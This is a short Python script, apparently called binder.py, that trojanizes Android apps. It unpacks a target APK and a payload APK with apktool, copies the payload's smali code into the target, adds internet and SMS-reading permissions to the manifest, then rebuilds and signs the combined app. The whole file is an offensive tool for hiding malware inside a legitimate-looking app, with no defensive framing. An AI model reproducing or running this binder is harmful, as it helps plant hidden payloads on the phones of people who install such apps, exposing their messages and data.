import os
import subprocess
import shutil
import sys

def bind(target_apk, payload_apk, output_apk):
    print("[*] Unpacking APKs...")
    os.system(f"apktool d -f {target_apk} -o target_dir")
    os.system(f"apktool d -f {payload_apk} -o payload_dir")

    print("[*] Injecting payload smali...")
    # Copy payload smali files into target
    shutil.copytree("payload_dir/smali/com/wahala", "target_dir/smali/com/wahala")

    print("[*] Patching AndroidManifest.xml...")
    # Read target manifest, add permissions and service
    manifest_path = "target_dir/AndroidManifest.xml"
    with open(manifest_path, "r") as f:
        manifest = f.read()

    # Inject permissions and service (simplified for brevity)
    permissions = """
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_SMS" />
    """
    manifest = manifest.replace("</manifest>", permissions + "</manifest>")
    
    with open(manifest_path, "w") as f:
        f.write(manifest)

    print("[*] Rebuilding bound APK...")
    os.system(f"apktool b target_dir -o {output_apk}")
    
    print("[*] Signing APK...")
    os.system(f"jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore my.keystore {output_apk} alias_name")
    
    print(f"[+] Done! Bound APK: {output_apk}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python binder.py <target.apk> <payload.apk> <output.apk>")
        sys.exit(1)
    bind(sys.argv[1], sys.argv[2], sys.argv[3])
